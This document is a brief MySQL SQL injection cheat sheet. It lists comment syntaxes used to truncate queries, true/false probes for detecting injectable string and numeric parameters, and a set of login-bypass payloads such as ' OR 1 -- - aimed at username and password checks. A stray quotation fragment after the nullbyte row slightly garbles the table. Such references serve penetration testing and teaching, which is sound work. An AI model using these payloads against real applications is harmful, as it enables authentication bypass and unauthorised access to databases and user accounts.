## MYSQL comments

|Type|Description|
|---|---|
|`#`|Hash comment|
|`/* MYSQL Comment */`|C-style comment|
|`/*! MYSQL Special SQL */`|Special SQL|
|`/*!32302 10*/`|Comment for MYSQL version 3.23.02|
|`-- -`|SQL comment|
|`;%00`|Nullbyte|" ' '"
|\`|Backtick |

## MYSQL Testing Injection

- **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`
    
    ```
    '	False
    ''	True
    "	False
    ""	True
    \	False
    \\	True
    ```
    
- **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`
    
    ```powershell
    AND 1	    True
    AND 0	    False
    AND true	True
    AND false	False
    1-false	    Returns 1 if vulnerable
    1-true	    Returns 0 if vulnerable
    1*56	    Returns 56 if vulnerable
    1*56	    Returns 1 if not vulnerable
    ```
    
- **Login**: Query like `SELECT * FROM Users WHERE userne = 'FUZZ1' AND password = 'FUZZ2';`
    
    ```powershell
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```